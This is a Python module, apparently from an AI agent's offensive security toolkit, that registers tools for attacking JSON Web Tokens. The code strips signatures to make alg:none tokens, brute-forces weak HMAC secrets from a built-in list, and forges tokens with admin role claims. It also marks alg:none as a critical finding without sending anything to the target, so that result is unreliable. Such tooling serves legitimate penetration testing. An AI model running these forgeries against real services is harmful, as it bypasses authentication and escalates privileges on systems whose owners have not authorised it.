"""
JWT Exploitation Tool — Epsilon Auth Agent capabilities

Tests for common JWT vulnerabilities:
1. Algorithm confusion (RS256 → HS256)
2. alg:none bypass
3. Weak secret brute force
4. JWT header injection
"""

from __future__ import annotations

import base64
import json
import logging
import hashlib
import hmac
from typing import Any

from agents.tools.registry import ToolSpec
from sandbox.sandbox_manager import shared_sandbox_manager, ExecResult

logger = logging.getLogger(__name__)

# Common JWT secrets for brute force testing
COMMON_SECRETS = [
    "secret",
    "jwt",
    "password",
    "123456",
    "admin",
    "token",
    "key",
    "supersecret",
    "changeme",
    "default",
]


class JWTTools:
    """JWT exploitation utilities."""

    @staticmethod
    def decode_b64(data: str) -> bytes:
        """Base64 decode with padding fix."""
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data)

    @staticmethod
    def encode_b64(data: bytes) -> str:
        """Base64 encode without padding."""
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

    @staticmethod
    def parse_token(token: str) -> tuple[dict, dict, str]:
        """Parse a JWT into header, payload, signature."""
        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")
        
        header = json.loads(JWTTools.decode_b64(parts[0]))
        payload = json.loads(JWTTools.decode_b64(parts[1]))
        signature = parts[2]
        
        return header, payload, signature

    @staticmethod
    def create_signature(header: dict, payload: dict, secret: str | bytes, algorithm: str = "HS256") -> str:
        """Create HMAC signature for JWT."""
        header_b64 = JWTTools.encode_b64(json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = JWTTools.encode_b64(json.dumps(payload, separators=(",", ":")).encode())
        message = f"{header_b64}.{payload_b64}"
        
        if algorithm == "HS256":
            sig = hmac.new(
                secret.encode() if isinstance(secret, str) else secret,
                message.encode(),
                hashlib.sha256
            ).digest()
        elif algorithm == "HS384":
            sig = hmac.new(
                secret.encode() if isinstance(secret, str) else secret,
                message.encode(),
                hashlib.sha384
            ).digest()
        elif algorithm == "HS512":
            sig = hmac.new(
                secret.encode() if isinstance(secret, str) else secret,
                message.encode(),
                hashlib.sha512
            ).digest()
        else:
            raise ValueError(f"Unsupported algorithm: {algorithm}")
        
        return JWTTools.encode_b64(sig)

    @staticmethod
    def forge_token(header: dict, payload: dict, secret: str | bytes, algorithm: str = "HS256") -> str:
        """Forge a new JWT with custom header and payload."""
        header_b64 = JWTTools.encode_b64(json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = JWTTools.encode_b64(json.dumps(payload, separators=(",", ":")).encode())
        signature = JWTTools.create_signature(header, payload, secret, algorithm)
        return f"{header_b64}.{payload_b64}.{signature}"


async def jwt_exploit(
    mission_id: str,
    target: str,
    token: str | None = None,
    endpoint: str = "",
    test_type: str = "all",
    cookie_name: str = "token",
) -> ExecResult:
    """
    Test JWT vulnerabilities against a target.
    
    Args:
        mission_id: Active mission ID
        target: Target URL
        token: JWT token to test (if None, tries to get from endpoint)
        endpoint: API endpoint to test (e.g., /api/admin)
        test_type: Type of test (all, alg_none, confusion, brute)
        cookie_name: Name of cookie containing JWT
    """
    results = {
        "vulnerable": False,
        "findings": [],
        "forged_tokens": {},
    }
    
    try:
        # If no token provided, try to get one from target
        if not token:
            logger.info(f"No token provided, attempting to obtain from {target}")
            # This would require authentication - skip for now
            return ExecResult(
                exit_code=0,
                stdout=json.dumps({"status": "no_token", "message": "No JWT token provided"}),
                stderr="",
                command="jwt_exploit (no token)",
            )
        
        # Parse the token
        try:
            header, payload, original_sig = JWTTools.parse_token(token)
        except Exception as e:
            return ExecResult(
                exit_code=1,
                stdout="",
                stderr=f"Failed to parse JWT: {e}",
                command="jwt_exploit (parse error)",
            )
        
        logger.info(f"Parsed JWT - alg: {header.get('alg')}, kid: {header.get('kid')}")
        
        # Test 1: Algorithm confusion (RS256 -> HS256)
        if test_type in ("all", "confusion") and header.get("alg") == "RS256":
            logger.info("Testing algorithm confusion (RS256 -> HS256)")
            
            # For this attack, we need the public key
            # Try common public key endpoints
            public_key_endpoints = [
                "/.well-known/jwks.json",
                "/.well-known/openid-configuration",
                "/api/auth/key",
                "/public.key",
            ]
            
            # For now, skip without public key
            results["findings"].append({
                "type": "jwt_algorithm_confusion",
                "severity": "potential",
                "description": "Token uses RS256 - algorithm confusion possible if public key is exposed",
                "requires_public_key": True,
            })
        
        # Test 2: alg:none bypass
        if test_type in ("all", "alg_none"):
            logger.info("Testing alg:none bypass")
            
            # Create token with alg:none
            none_header = {**header, "alg": "none"}
            none_payload = payload
            none_token = f"{JWTTools.encode_b64(json.dumps(none_header).encode())}.{JWTTools.encode_b64(json.dumps(none_payload).encode())}."
            
            results["forged_tokens"]["alg_none"] = none_token
            results["findings"].append({
                "type": "jwt_alg_none",
                "severity": "critical",
                "description": "Token may accept alg:none - forged token created without signature",
                "forged_token": none_token[:50] + "...",
            })
            results["vulnerable"] = True
        
        # Test 3: Weak secret brute force
        if test_type in ("all", "brute") and header.get("alg", "").startswith("HS"):
            logger.info("Testing weak JWT secrets")
            
            for secret in COMMON_SECRETS:
                try:
                    forged_sig = JWTTools.create_signature(header, payload, secret, header.get("alg", "HS256"))
                    if forged_sig == original_sig:
                        logger.info(f"Found weak secret: {secret}")
                        results["findings"].append({
                            "type": "jwt_weak_secret",
                            "severity": "critical",
                            "description": f"JWT signed with weak secret: '{secret}'",
                            "secret": secret,
                        })
                        results["vulnerable"] = True
                        
                        # Create admin forged token
                        admin_payload = {**payload, "role": "admin", "isAdmin": True}
                        admin_token = JWTTools.forge_token(header, admin_payload, secret, header.get("alg", "HS256"))
                        results["forged_tokens"]["admin"] = admin_token
                        break
                except Exception:
                    continue
        
        # Test 4: Try common privilege escalation payloads
        if payload.get("role") != "admin" and payload.get("isAdmin") != True:
            logger.info("Testing privilege escalation via JWT modification")
            
            # Try to forge admin token if we found weak secret
            if "jwt_weak_secret" in [f["type"] for f in results["findings"]]:
                pass  # Already created above
            else:
                # Note: Without knowing the secret, we can't forge
                results["findings"].append({
                    "type": "jwt_privilege_escalation_potential",
                    "severity": "info",
                    "description": "Token payload can be modified for privilege escalation if secret is known",
                    "current_role": payload.get("role", "unknown"),
                })
        
        return ExecResult(
            exit_code=0,
            stdout=json.dumps(results, indent=2),
            stderr="",
            command="jwt_exploit",
        )
        
    except Exception as e:
        logger.error(f"JWT exploit error: {e}")
        return ExecResult(
            exit_code=1,
            stdout="",
            stderr=str(e),
            command="jwt_exploit (error)",
        )


# Tool specification for registry
jwt_tool = ToolSpec(
    name="jwt_exploit",
    description="Test JWT for vulnerabilities (alg:none, algorithm confusion, weak secrets)",
    args_schema={
        "target": "Target URL",
        "token": "JWT token to test (optional)",
        "endpoint": "API endpoint to test",
        "test_type": "Type of test: all, alg_none, confusion, brute",
        "cookie_name": "Cookie name containing JWT (default: token)",
    },
    execute=jwt_exploit,
)


async def jwt_forge(
    mission_id: str,
    header: dict,
    payload: dict,
    secret: str,
    algorithm: str = "HS256",
) -> ExecResult:
    """
    Forge a JWT with custom claims.
    
    Args:
        mission_id: Active mission ID
        header: JWT header dictionary
        payload: JWT payload dictionary  
        secret: Secret key for signing
        algorithm: Signing algorithm (HS256, HS384, HS512)
    """
    try:
        token = JWTTools.forge_token(header, payload, secret, algorithm)
        
        result = {
            "token": token,
            "header": header,
            "payload": payload,
            "algorithm": algorithm,
        }
        
        return ExecResult(
            exit_code=0,
            stdout=json.dumps(result, indent=2),
            stderr="",
            command="jwt_forge",
        )
    except Exception as e:
        return ExecResult(
            exit_code=1,
            stdout="",
            stderr=f"Failed to forge JWT: {e}",
            command="jwt_forge (error)",
        )


jwt_forge_tool = ToolSpec(
    name="jwt_forge",
    description="Forge a JWT token with custom claims and signing",
    args_schema={
        "header": "JWT header dictionary",
        "payload": "JWT payload dictionary",
        "secret": "Secret key for signing",
        "algorithm": "Signing algorithm (default: HS256)",
    },
    execute=jwt_forge,
)
